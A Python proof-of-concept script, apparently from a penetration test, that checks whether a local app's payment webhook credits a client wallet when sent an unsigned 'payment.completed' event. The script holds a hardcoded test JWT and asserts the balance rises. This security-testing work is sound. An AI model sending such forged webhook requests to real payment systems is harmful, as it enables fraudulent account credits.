"""
WSTG-ATHN-10 / WSTG-BUSL-03: Unsigned payment webhook.
Expected: POST /api/webhooks/payment credits the client wallet without a signature header.
"""
import requests

BASE = "http://localhost:3000"
CLIENT_TOKEN = (
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9."
    "eyJpZCI6IjU2NjRiN2YxLWRjNTctNGFhYy1hM2YxLTJlYzU5ZDc5MTVmOSIsImVtYWlsIjoidGVz"
    "dGNsaWVudEBoaXJlZmxvdy5jb20iLCJyb2xlIjoiY2xpZW50Iiwid2FsbGV0QmFsYW5jZSI6IjEx"
    "MDAxMDEwMjE1Nzc3MyIsImlhdCI6MTc3NDk2MTAzNywiZXhwIjoxNzc1NTY1ODM3fQ."
    "3pECPDykXAOh8VbOb0q19EcgmwsQBYWnq28wfG8AZ0o"
)
CLIENT_ID = "5664b7f1-dc57-4aac-a3f1-2ec59d7915f9"

before = requests.get(f"{BASE}/api/payments/wallet", headers={
    "Authorization": f"Bearer {CLIENT_TOKEN}",
}, timeout=10).json()["balance"]

webhook = requests.post(f"{BASE}/api/webhooks/payment", json={
    "event": "payment.completed",
    "data": {
        "user_id": CLIENT_ID,
        "amount": 1,
        "description": "unsigned webhook poc",
    },
}, timeout=10)

after = requests.get(f"{BASE}/api/payments/wallet", headers={
    "Authorization": f"Bearer {CLIENT_TOKEN}",
}, timeout=10).json()["balance"]

print("Webhook:", webhook.status_code, webhook.text)
print("Balance:", before, "->", after)
assert webhook.status_code == 200
assert int(after) == int(before) + 1
print("\n[VULNERABLE] Unsigned webhook updated the wallet balance")
